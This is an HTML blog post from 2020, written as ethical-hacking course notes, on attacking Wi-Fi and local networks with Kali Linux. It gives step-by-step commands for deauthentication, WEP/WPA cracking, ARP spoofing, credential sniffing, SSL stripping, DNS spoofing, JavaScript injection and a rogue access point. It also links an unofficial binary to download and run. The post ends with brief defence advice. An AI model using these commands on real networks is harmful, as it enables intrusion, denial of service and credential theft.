@@ -1,0 +1,522 @@
+
+<!DOCTYPE html>
+<html lang="english">
+
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />     <meta name="robots" content="" />     <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro|Source+Sans+Pro:300,400,400i,700" rel="stylesheet">     <link rel="stylesheet" type="text/css" href="https://jackmckew.dev/theme/stylesheet/style.min.css"> 
+    <link rel="stylesheet" type="text/css" href="https://jackmckew.dev/theme/pygments/github.min.css">
+    <link rel="stylesheet" type="text/css" href="https://jackmckew.dev/theme/font-awesome/css/fontawesome.css">
+    <link rel="stylesheet" type="text/css" href="https://jackmckew.dev/theme/font-awesome/css/brands.css">
+    <link rel="stylesheet" type="text/css" href="https://jackmckew.dev/theme/font-awesome/css/solid.css">
+    <link rel="stylesheet" type="text/css" href="https://jackmckew.dev/theme/font-awesome.css">     <script src="https://jackmckew.dev/theme/tipuesearch/jquery.min.js"></script>
+    <script src="https://jackmckew.dev/theme/tipuesearch/tipuesearch.min.js"></script>
+    <script src="https://jackmckew.dev/theme/tipuesearch/tipuesearch.js"></script>
+    <script src="https://jackmckew.dev/theme/tipuesearch/tipuesearch_set.js"></script>
+    <link rel="stylesheet" href="https://jackmckew.dev/theme/tipuesearch/tipuesearch.css" />
+    <script src="https://jackmckew.dev/tipuesearch_content.js"></script>
+    <link href="https://jackmckew.dev/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Jack McKew's Blog Atom">     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon"> <!-- Google Analytics -->
+<script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-131173168-2', 'auto');
+  ga('send', 'pageview');
+</script>
+<!-- End Google Analytics --><meta name="author" content="Jack McKew" />
+<meta name="description" content="This post will go into ways we can use Kali Linux to hack networks and PCs! What is Kali Linux? &#34;Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing&#34;. Kali Linux is free to download and you can find it at: https://www.kali …" />
+<meta name="keywords" content="software, infosec">
+
+
+<meta property="og:site_name" content="Jack McKew's Blog"/>
+<meta property="og:title" content="Network Hacking with Kali Linux"/>
+<meta property="og:description" content="This post will go into ways we can use Kali Linux to hack networks and PCs! What is Kali Linux? &#34;Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing&#34;. Kali Linux is free to download and you can find it at: https://www.kali …"/>
+<meta property="og:locale" content="en_US"/>
+<meta property="og:url" content="https://jackmckew.dev/network-hacking-with-kali-linux.html"/>
+<meta property="og:type" content="article"/>
+<meta property="article:published_time" content="2020-08-28 00:00:00+10:00"/>
+<meta property="article:modified_time" content=""/>
+<meta property="article:author" content="https://jackmckew.dev/author/jack-mckew.html">
+<meta property="article:section" content="Software"/>
+<meta property="article:tag" content="software"/>
+<meta property="article:tag" content="infosec"/>
+<meta property="og:image" content="https://jackmckew.dev/img/nmap.png">
+
+    <title>Jack McKew's Blog &ndash; Network Hacking with Kali Linux</title>
+
+</head>
+
+<body>
+    <aside>
+        <div>
+            <a href="https://jackmckew.dev">
+        <img src="/jm-photo.jpg" alt="Jack McKew's Blog" title="Jack McKew's Blog">
+      </a>
+            <h1><a href="https://jackmckew.dev">Jack McKew's Blog</a></h1>
+
+            <p>Engineer | Software Developer | Data Scientist</p>            <p>Number of Posts: 79</p>
+            <p>Number of Words: 54,852</p>
+            <p>Number of Lines of Code 3,944</p>
+            <form class="navbar-search" action="/search.html" role="search">
+                <input type="text" name="q" id="tipue_search_input" placeholder="Search..">
+            </form>
+            <style>
+                .bmc-button img {
+                    height: 34px !important;
+                    width: 35px !important;
+                    margin-bottom: 1px !important;
+                    box-shadow: none !important;
+                    border: none !important;
+                    vertical-align: middle !important;
+                }
+                
+                .bmc-button {
+                    margin-top: 15px !important;
+                    margin-bottom: 20px !important;
+                    padding: 7px 15px 7px 10px !important;
+                    line-height: 35px !important;
+                    height: 51px !important;
+                    text-decoration: none !important;
+                    display: inline-flex !important;
+                    color: #ffffff !important;
+                    /* background-color: #FF813F !important; */
+                    border-radius: 5px !important;
+                    border: 1px solid transparent !important;
+                    padding: 7px 15px 7px 10px !important;
+                    font-size: 22px !important;
+                    letter-spacing: 0.6px !important;
+                    box-shadow: 0px 1px 2px rgba(190, 190, 190, 0.5) !important;
+                    -webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;
+                    font-family: 'Cookie', cursive !important;
+                    -webkit-box-sizing: border-box !important;
+                    box-sizing: border-box !important;
+                }
+                
+                .bmc-button:hover,
+                .bmc-button:active,
+                .bmc-button:focus {
+                    -webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;
+                    text-decoration: none !important;
+                    box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;
+                    opacity: 0.85 !important;
+                    color: #ffffff !important;
+                }
+            </style>
+            <link href="https://fonts.googleapis.com/css?family=Cookie" rel="stylesheet">
+            <a class="bmc-button btn" target="_blank" href="https://www.buymeacoffee.com/jackmckew"><img src="https://jackmckew.dev/theme/img/pizza.png" alt="🍕"><span style="margin-left:5px;font-size:28px !important;">Buy me a Pizza</span></a>
+            <br>
+            <a href="https://feedburner.google.com/fb/a/mailverify?uri=JackMckewsBlog&amp;loc=en_US" class="mbscreenphone phonelink btn btn-info btn-lg">
+                Subscribe by Email <i class="fas fa-envelope"></i>
+              </a>             <nav>
+                <ul class="list">
+                    <li><a target="_blank" href="https://jackmckew.dev/pages/contact.html#contact">Contact</a></li>
+                    <li><a target="_blank" href="https://jackmckew.dev/pages/cv-professional.html#cv-professional">CV/Professional</a></li>
+                </ul>
+            </nav>
+
+            <ul class="social">
+                <li>
+                    <a  class="sc-twitter" href="https://twitter.com/Jac_McQ" target="_blank">
+                        <i class="fab fa-twitter">
+            </i>
+                    </a>
+                </li>
+                <li>
+                    <a  class="sc-linkedin" href="https://www.linkedin.com/in/jack-mckew/" target="_blank">
+                        <i class="fab fa-linkedin">
+            </i>
+                    </a>
+                </li>
+                <li>
+                    <a  class="sc-github" href="https://github.com/JackMcKew" target="_blank">
+                        <i class="fab fa-github">
+            </i>
+                    </a>
+                </li>
+            </ul>
+        </div>
+
+
+    </aside>
+    <main>
+        <nav>
+            <a href="https://jackmckew.dev"> Home</a>             <a href="/archives.html">Archives</a>             <a href="/categories.html">Categories</a>             <a href="/tags.html">Tags</a>             <a href="/sitemap.xml">Sitemap</a>             <a href="https://jackmckew.dev/feeds/all.atom.xml"> Atom</a>         </nav>
+<article class="single">
+  <header>
+      
+    <h1 id="network-hacking-with-kali-linux">Network Hacking with Kali Linux</h1>
+    <p>
+       Posted on Fri 28 August 2020 in <a href="https://jackmckew.dev/category/software.html">Software</a>
+
+        &#8226; 9 min read
+    </p>
+  </header>
+
+
+  <div>
+    <body><p>This post will go into ways we can use Kali Linux to hack networks and PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: <a href="https://www.kali.org/downloads/">https://www.kali.org/downloads/</a>. These are notes from the Udemy course: <a href="https://www.udemy.com/course/learn-ethical-hacking-from-scratch/">https://www.udemy.com/course/learn-ethical-hacking-from-scratch/</a>, highly recommend this course, very practical and beginner friendly.</p>
+<blockquote>
+<p>Thank you to Chris B for helping me with the notes in this post below!</p>
+</blockquote>
+<h2 id="table-of-contents">Table of Contents <!-- omit in toc --></h2>
+<ul>
+<li><a href="#network-hacking">Network Hacking</a><ul>
+<li><a href="#networking-fundamentals">Networking Fundamentals</a><ul>
+<li><a href="#checking-network-configuration">Checking Network Configuration</a></li>
+<li><a href="#checking-wireless-networks">Checking Wireless Networks</a></li>
+<li><a href="#sniffing-data-from-specific-device">Sniffing Data from Specific Device</a></li>
+<li><a href="#deauthentication-attack">DeAuthentication Attack</a></li>
+</ul>
+</li>
+<li><a href="#gaining-access">Gaining Access</a><ul>
+<li><a href="#cracking-wep">Cracking WEP</a></li>
+<li><a href="#fake-authentication-attack">Fake Authentication Attack</a></li>
+</ul>
+</li>
+<li><a href="#cracking-wpawpa2">Cracking WPA/WPA2</a><ul>
+<li><a href="#with-wps">With WPS</a></li>
+<li><a href="#without-wps">Without WPS</a></li>
+</ul>
+</li>
+<li><a href="#securing-your-network">Securing your Network</a></li>
+<li><a href="#post-connection-attacks-mitm-attacks">Post Connection Attacks (MITM Attacks)</a><ul>
+<li><a href="#discovering-devices-on-the-network">Discovering Devices on the Network</a><ul>
+<li><a href="#netdiscover">NetDiscover</a></li>
+<li><a href="#nmap">Nmap</a></li>
+</ul>
+</li>
+<li><a href="#arp-attack">ARP Attack</a><ul>
+<li><a href="#bettercap">BetterCap</a></li>
+</ul>
+</li>
+<li><a href="#https">HTTPS</a></li>
+<li><a href="#dns-spoofing">DNS Spoofing</a></li>
+<li><a href="#javascript-code-injection">JavaScript Code Injection</a></li>
+</ul>
+</li>
+<li><a href="#wireshark">WireShark</a></li>
+<li><a href="#creating-a-honeypot-fake-access-point">Creating a Honeypot (fake access point)</a></li>
+<li><a href="#detection--security">Detection &amp; Security</a><ul>
+<li><a href="#detecting-arp-attacks">Detecting ARP Attacks</a></li>
+<li><a href="#preventing-mitm-attacks">Preventing MITM Attacks</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="network-hacking">Network Hacking</h2>
+<h3 id="networking-fundamentals">Networking Fundamentals</h3>
+<h4 id="checking-network-configuration">Checking Network Configuration</h4>
+<p>Commands to use in terminal to check network state:</p>
+<ul>
+<li><code>ifconfig</code> for all connection states</li>
+<li><code>iwconfig</code> for all <strong>wireless</strong> connection states</li>
+</ul>
+<p>The MAC address (specified by manufacturer) will be listed in <code>ifconfig</code> under <code>ether</code>. You can alter the MAC address in memory directly by:</p>
+<ol>
+<li>Disabling that adapter <code>ifconfig eth0 down</code></li>
+<li>Reassign a new MAC address <code>ifconfig eth0 hw ether 00:11:22:33:44:55</code></li>
+</ol>
+<blockquote>
+<p>The MAC address will be reset upon restarting or reconnecting the device.</p>
+</blockquote>
+<h4 id="checking-wireless-networks">Checking Wireless Networks</h4>
+<p>We can seek out wireless networks using <code>airodump-ng</code>. Ensure that your wireless access point (typically USB device) is in monitor mode with <code>iwconfig wlan0 mode monitor</code>. Now we can listen to available networks with <code>airodump-ng mon0</code> (where <code>mon0</code> is the access point in monitor mode). To listen on a variety of bands (eg, 2.4GHz and 5GHz), use the command <code>airodump-ng --band abg mon0</code>.</p>
+<h4 id="sniffing-data-from-specific-device">Sniffing Data from Specific Device</h4>
+<p>To sniff data to a file, the command <code>airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card]</code>. This will sniff the data being transmitted by this device, and write it to a series of files. This data can later be analysed by programs like WireShark (because the data captured is potentially encrypted).</p>
+<h4 id="deauthentication-attack">DeAuthentication Attack</h4>
+<p>This is a denial of service attack, but specifically for use in a Wi-Fi context. Ensuring to run <code>airodump-ng</code> at the same time during this attack. This is achieved with <code>aireplay-ng</code> and all that is required is to know the target MAC address (which is available in generic network sniffing (see above)).</p>
+<p><code>aireplay-ng -D --deauth [#deauthPackets] -a [NetworkMAC] -c [TargetMAC] [wifi card]</code></p>
+<h3 id="gaining-access">Gaining Access</h3>
+<h4 id="cracking-wep">Cracking WEP</h4>
+<ol>
+<li>Capture a large amount of packets <code>airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card]</code></li>
+<li>run <code>aircrack-ng [filename.cap]</code> (leave step 1 running in the background)<ul>
+<li>To connect with ascii found, copy paste and connect!</li>
+<li>TO CONNECT WITH KEY FOUND!, copy the key after the text provided in the square brackets, remove the colons [:], and copy paste that number when the Wi-Fi asks for a password.</li>
+<li>If the network is not busy and not enough packets are being sent force the network to make packets (see step 3 in <a href="#fake-authentication-attack">Fake Authentication Attack</a>)</li>
+</ul>
+</li>
+</ol>
+<h4 id="fake-authentication-attack">Fake Authentication Attack</h4>
+<ol>
+<li>run <code>airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card]</code></li>
+<li>run <code>aireplay-ng --fakeauth [number of times (0 for 1 time)] -D -a [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ]</code><ul>
+<li>(Note in monitor mode MAC is the first 12 digits after unspec + replace [-] with [:] )</li>
+</ul>
+</li>
+<li>make sure your associated with the network (step 2) and run <code>aireplay-ng --arpreplay -b [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ]</code></li>
+<li>then run the crack <code>aircrack-ng [filename.cap]</code></li>
+</ol>
+<blockquote>
+<p>may want to leave all 3 running at once</p>
+</blockquote>
+<h3 id="cracking-wpawpa2">Cracking WPA/WPA2</h3>
+<p>For cracking WPA or WPA2, look out for WPS, this will enable the hack to much simpler as WPS is an 8 digit pin. Otherwise same attack as <a href="#cracking-wep">WEP</a>, but will take longer as WPA/WPA2 were designed to solve WEP's problems, thus more secure.</p>
+<blockquote>
+<p>WPS is only available if the router supports WPS (and not PBS(push button authentication))</p>
+</blockquote>
+<h4 id="with-wps">With WPS</h4>
+<ol>
+<li>to find all networks with WPS enabled use <code>wash --interface [WirelessAdapter]</code></li>
+<li>to attack a network with WPS:<ol>
+<li>run fake auth on the router <code>aireplay-ng --fakeauth [number of times (0 for 1 time)] -D -a [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ]</code> + leave airodump-ng in background (see WEP step 1)</li>
+<li>use reaver <code>reaver --bssid [targetMAC] --channel [channel] --interface [WirelessAdapter] -vvv --no-associate</code>
+    &gt; if reaver doesn't work use this version of reaver <a href="https://ufile.io/lro4nkdv">https://ufile.io/lro4nkdv</a> make sure you run <code>chmod +x reaver</code> then <code>./reaver [your command here]</code></li>
+</ol>
+</li>
+</ol>
+<h4 id="without-wps">Without WPS</h4>
+<ol>
+<li>monitor and write to a file</li>
+<li>deauthenticate a client to capture handshake</li>
+<li>create a word list:<ol>
+<li>Download a word list off the internet or:<ul>
+<li>Crunch can be used to create a word list using <code>crunch [min] [max] [characters] -t [pattern] -o [filename]</code></li>
+</ul>
+</li>
+<li>Need handshake + word list to crack WPA</li>
+<li>to begin cracking the password use <code>aircrack-ng [.cap file] -w [wordlist]</code><ul>
+<li>methods to speedup<ol>
+<li>use online services with handshake &amp; word list</li>
+<li>use GPU for cracking</li>
+<li>use rainbow tables</li>
+<li>pipe word list as it is being created</li>
+</ol>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<h3 id="securing-your-network">Securing your Network</h3>
+<ul>
+<li>Ensure WPA2 is used with a long, complex password with letters, special characters and numbers</li>
+<li>Change the password to the router login (typically admin, admin)</li>
+<li>Disable WPS</li>
+<li>Specify exact MAC addresses to connect (visitors won't like this)</li>
+</ul>
+<h3 id="post-connection-attacks-mitm-attacks">Post Connection Attacks (MITM Attacks)</h3>
+<h4 id="discovering-devices-on-the-network">Discovering Devices on the Network</h4>
+<p>Need to gather information (MAC, IP etc.), there are programs that do for you = NetDiscover, Nmap.</p>
+<h5 id="netdiscover">NetDiscover</h5>
+<ul>
+<li>to use NetDiscover <code>netdiscover -r [ip_range (can only access IPs on the same subnet eg. 10.0.2.xx ends at 254 so eg. 10.0.2.1/24 /24 means all IPs]</code></li>
+<li>use your ip address with the last .xx being .1</li>
+<li>if using wireless card use <code>-i [wirelessCard]</code> before <code>-r</code> or just connect to the network.</li>
+<li>if not finding anything try (interface only if using Wi-Fi, MUST BE IN MANAGED/AUTO MODE)<ul>
+<li><code>netdiscover -i &lt;interface&gt; &lt;gateway IP/8&gt;</code></li>
+<li><code>netdiscover -i &lt;interface&gt; &lt;gateway IP/16&gt;</code></li>
+<li><code>netdiscover -i &lt;interface&gt; &lt;gateway IP/24&gt;</code></li>
+</ul>
+</li>
+<li>To make sure of the gateway IP address, please route -n</li>
+</ul>
+<h5 id="nmap">Nmap</h5>
+<blockquote>
+<p>Zenmap is the graphical user interface of Nmap use <zenmap></zenmap></p>
+</blockquote>
+<ol>
+<li>in the target  use your network with xx at the end eg. 10.0.2.1/24 (see above <a href="#netdiscover">NetDiscover</a>)</li>
+<li>in the profiles there are a number of default commands to use. (ping scan might not list everything)</li>
+<li>use info found to work out things eg. does this model router have any exploits or the phone brand is samsung meaning it's running on android</li>
+<li>Quick Scan(profile) - also shows open ports and the services running on these ports eg. if port 80 is open a webserver is running.</li>
+<li>Quick scan plus - Quick scan but also shows Operating system, device type and the programs and program versions running on the ports.</li>
+</ol>
+<p><img alt="Nmap" class="img-fluid" src="https://jackmckew.dev/img/nmap.png"/></p>
+<blockquote>
+<p>Fun Note: when you jailbrake an iOS device it auto installs an ssh server with default password being: alpine, and uname: root, use <code>ssh root@[phone/server_ip]</code> then enter yes and alpine</p>
+</blockquote>
+<h4 id="arp-attack">ARP Attack</h4>
+<p>Address Resolution Protocol (ARP) allows us to link ip addresses to MAC addresses.</p>
+<ul>
+<li>ARP request sends a signal to all clients on the network asking who has this XXX IP the IP will respond with it's MAC address</li>
+<li>goal is to trick the router into thinking you are the victim and the victim into thinking you are the router. (Man in the Middle)</li>
+<li>Use program ARPspoof <code>arpspoof -i [interface(wificard)] -t [clientip] [gatewayip]</code> and then <code>arpspoof -i [interface(wificard)] -t [gatewayip] [clientip]</code><ul>
+<li>There is also a tool called bettercap (more features).</li>
+<li>ARPspoof is not default installed use <code>apt-get update &amp;&amp; apt-get install -y dsniff</code></li>
+</ul>
+</li>
+<li>Packets will be blocked by default on linux to allow packets to flow though on linux use <code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code> (echo 0 to revert)</li>
+</ul>
+<h5 id="bettercap">BetterCap</h5>
+<ul>
+<li>use <code>bettercap -iface [interface]</code> (interface must be connected to the network you wish to attack)<ul>
+<li>use help to get info of modules running or help [module for more]</li>
+</ul>
+</li>
+<li><code>net.probe on</code> gets all clients</li>
+<li><code>net.show</code> shows all clients</li>
+<li>To do Man in the middle in Bettercap use <code>help arp.spoof</code> you need to modify some of the options, to do this use <code>set [option_name] [value]</code> (set full.duplux on and set targets in .targets)</li>
+<li>once settings have been set up turn it on <code>arp.spoof on</code></li>
+<li>To capture data that is being spoofed and analyse it use the net.sniff module <code>net.sniff on</code> , you will see entered usernames and passwords under POST</li>
+<li>Instead of doing the above you can use a caplet, to capture data for you<ol>
+<li>open a text file and type each command<ul>
+<li><code>net.probe on</code></li>
+<li><code>set arp.spoof.fullduplex true</code></li>
+<li><code>set arp.spoof.targets [target_ips]</code> (will need to change IP in script each time you use, to target multiple IPs use the comma [,] after each IP)</li>
+<li><code>arp.spoof on</code></li>
+<li><code>net.sniff on</code></li>
+</ul>
+</li>
+<li>Save the file with .cap</li>
+<li>From Bash use <code>bettercap -iface [interface] -caplet [filename]</code></li>
+</ol>
+</li>
+</ul>
+<h4 id="https">HTTPS</h4>
+<p>HTTP is sent as plain text HTTPS adds a extra layer of security called TLS (Transport layer security) or SSL(Secure Socket Layer), they encrypt traffic being sent. Almost impossible to break, therefore easiest method is to downgrade the connection to HTTP can use a tool called <code>SSL Strip</code>. BetterCap has a caplet for this however it does not replace all HTTPS links in the loaded pages. This won't work if the target site has implemented HSTS, this can also be bypassed but is more difficult (by tricking the browser into loading a different site). One method is to use <code>hstshijack</code>, which a resource for this is at <a href="https://github.com/bettercap/caplets/tree/master/hstshijack">https://github.com/bettercap/caplets/tree/master/hstshijack</a>.</p>
+<h4 id="dns-spoofing">DNS Spoofing</h4>
+<p>Instead of returning Google's IP return a malicious server. Kali comes installed with a webserver, to start it use <code>service apache2 start</code> go to KALI's IP to use. The default webpage is stored in /var/www/html.</p>
+<p>To spoof:</p>
+<ol>
+<li>Start bettercap with the caplet coded above</li>
+<li>Use the dns.spoof module:<ol>
+<li>if you do not want to redirect to yourself change the dns.spoof.address value</li>
+<li>set dns.spoof.all so bettercap responds to any dns request <code>set dns.spoof.all true</code></li>
+<li>set dns.spoof.domains to the sites you wish to be redirected to you. <code>set dns.spoof.domains [domain1, domain2]</code> (use * as a wildcard to do any subdoamin under a website eg.*.kali.org)</li>
+<li>start dns.spoof <code>dns.spoof on</code></li>
+</ol>
+</li>
+</ol>
+<h4 id="javascript-code-injection">JavaScript Code Injection</h4>
+<p>How to insert JavaScript code:</p>
+<ol>
+<li>Have JavaScript code file</li>
+<li>go to the hstshijack plugin /usr/share/bettercap/caplets</li>
+<li>go to the .cap file and add the js code under the payloads, * means all domains then : eg. *:/code.js (otherwise use a domain).</li>
+</ol>
+<h3 id="wireshark">WireShark</h3>
+<p>Wireshark is the world's foremost and widely-used network protocol analyzer. Only analyses data flowing though your computer, so works with man in the middle. Go into settings and select the interface you want to start capturing (hold ctl if you want to cap multiple) in output you can send it to a cap file for later analysis. HTTPS will be encrypted so be sure to use hstshijack. Green = TCP packets, Darkblue = DNS, lightblue = UTP, BLACK = TCP with errors.</p>
+<p>Filtering packets:</p>
+<ol>
+<li>in the filters type: http</li>
+<li>Double Click to get more info. Under the Hypertext Transfer Protocol section important info is shown.</li>
+<li>can see what type next too the info</li>
+<li>right click a packet and go follow &gt; http stream to see exactly what was sent.</li>
+<li>again under the double click &gt; Hypertext Transfer Protocol you can see what was requested or responded.</li>
+</ol>
+<p>To find usernames and passwords check under POST requests and under the html form url encoded. ctl + f to find data, set search to packet details and set last one to string and oyu can type a name like admin etc.</p>
+<p>If you want to put BetterCap data in a file use <code>set net.sniff.output [file]</code></p>
+<h3 id="creating-a-honeypot-fake-access-point">Creating a Honeypot (fake access point)</h3>
+<p>We use <code>hostapd-mana</code> to achieve this, mana is a featureful rogue access point first presented at Defcon 22 by Dominic White <a href="https://github.com/sensepost/hostapd-mana">https://github.com/sensepost/hostapd-mana</a>.</p>
+<p>Use Mana:</p>
+<ol>
+<li><code>start-noupstream.sh</code> -Starts access point with no internet access</li>
+<li><code>start-nat-simple.sh</code> -Starts an access point with internet access (use this)</li>
+<li><code>start-nat-full.sh</code> -Starts a access point and automatically starts sniffing data, bypass https</li>
+</ol>
+<p>To install Mana on Linux:</p>
+<ul>
+<li><code>apt-get update</code></li>
+<li><code>apt-get --yes install build-essential pkg-config git libnl-genl-3-dev libssl-dev</code></li>
+<li><code>cd /tmp</code></li>
+<li><code>git clone https://github.com/sensepost/hostapd-mana</code></li>
+<li><code>cd hostapd-mana</code></li>
+<li><code>make -C hostapd</code></li>
+<li><code>mv /tmp/hostapd-mana/hostapd/ /usr/lib/mana-toolkit</code></li>
+<li><code>cd /usr/share/</code></li>
+<li><code>git clone --depth 1 https://github.com/sensepost/mana.git</code></li>
+<li><code>mv mana mana-toolkit</code></li>
+<li><code>mkdir /etc/mana-toolkit/</code></li>
+<li><code>mv mana-toolkit/run-mana/conf/*.conf /etc/mana-toolkit/</code></li>
+</ul>
+<p>Editing Mana:</p>
+<ul>
+<li>edit mana settings in /etc/mana-toolkit/hostatp-mana.conf &gt; check interface + SSID (Name).</li>
+<li>edit start script in /usr/share/mana-toolkit/run-mana/start-nat-simple.sh &gt; check upstream interface (set to the one that has internet access), check phy (the card that is going to broadcast the network[wlan0]).</li>
+<li>start the script <code>bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh</code></li>
+</ul>
+<h3 id="detection-security">Detection &amp; Security</h3>
+<h4 id="detecting-arp-attacks">Detecting ARP Attacks</h4>
+<p>On Windows use <code>arp -a</code> if the gateway matches another MAC in the network = bad, not practical to type every time and constantly so use XARP (<a href="http://www.xarp.net/">http://www.xarp.net/</a>)!</p>
+<p>To discover suspicious activity on a network use wireshark. &gt; go to preferances &gt; protocols &gt; ARP &gt; enable detect arp request storms. Broadcast packets are dangerous that is the hacker detecting the network. If you go to Expert Information, you can see the storm info. Also under expert information you can see warning for arp poisoning and other things. You can use static arp tables (you must manually configure) system will refuse if arp changes. Problem if you need to connect to different networks.</p>
+<blockquote>
+<p>This is only detection, not prevention. There is not much we can do after detecting except exiting that network or changing access control.</p>
+</blockquote>
+<h4 id="preventing-mitm-attacks">Preventing MITM Attacks</h4>
+<p>Make sure everything is encrypted using https (Plugin to do this automatically <a href="https://www.eff.org/https-everywhere">https://www.eff.org/https-everywhere</a>) or use a VPN, preferably use both!.</p></body>
+  </div>
+  <div class="tag-cloud">
+    <p>
+      <a href="https://jackmckew.dev/tag/software.html">software</a>
+      <a href="https://jackmckew.dev/tag/infosec.html">infosec</a>
+    </p>
+  </div>
+
+
+  <div class="neighbors">
+    <a class="btn float-left" href="https://jackmckew.dev/types-of-averages-means.html" title="Types of Averages (Means)">
+      <i class="fa fa-angle-left"></i>  Previous Post
+    </a>
+  </div>
+
+  <div class="related-posts">
+    <h4> You might enjoy</h4>
+    <ul class="related-posts">
+      <li><a href="https://jackmckew.dev/episode-12-what-is-git.html">Episode 12 - What is Git?</a></li>
+    </ul>
+  </div>
+
+
+<!-- Disqus -->
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'jackmckew-dev';
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>
+     Please enable JavaScript to view comments.
+</noscript>
+<!-- End Disqus -->
+</article>
+
+        <footer>
+<p>&copy;  </p>
+<p> Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme</p>        </footer>
+    </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack McKew's Blog ",
+  "url" : "https://jackmckew.dev",
+  "image": "/jm-photo.jpg",
+  "description": ""
+}
+</script><a href="https://github.com/JackMcKew/jackmckew.dev" class="github-corner" aria-label="View source on Github">
+    <svg width="80"
+         height="80"
+         viewBox="0 0 250 250"
+         style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;"
+         aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor"
+              style="transform-origin: 130px 106px;"
+              class="octo-arm">
+        </path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor"
+              class="octo-body">
+        </path>
+    </svg>
+</a>
+<style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>    <script>
+        $(document).ready(function() {
+            $('#tipue_search_input').tipuesearch();
+        });
+    </script>
+</body>
+
+</html>
